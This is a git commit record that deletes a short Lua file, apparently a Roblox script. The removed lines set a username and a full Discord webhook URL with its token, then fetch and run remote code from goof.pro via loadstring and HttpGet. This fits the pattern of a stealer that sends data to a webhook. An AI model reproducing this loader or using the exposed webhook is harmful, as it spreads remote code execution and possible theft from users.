0b7bea3982bd62a0cb75a9f6dc51bfab5a316ddc
Senpaigmx <124633647+Senpaigmx@users.noreply.github.com>
2023-07-28 02:49:42 +0300

    Delete 283382382838823823.lua

--- 283382382838823823.lua
+++
@@ -1,4 +0,0 @@
-UserName = "robzi_play8"
-WebHook = "https://discord.com/api/webhooks/1123874107130388542/c62raSypIqIiIm2zdPo0CbN46egjbFz-G2vZkdFCngTa8Kq_nZ-u2ZiJuom3hwl1p220"
-
-loadstring(game:HttpGet("https://goof.pro/s/bank.lua", true))()
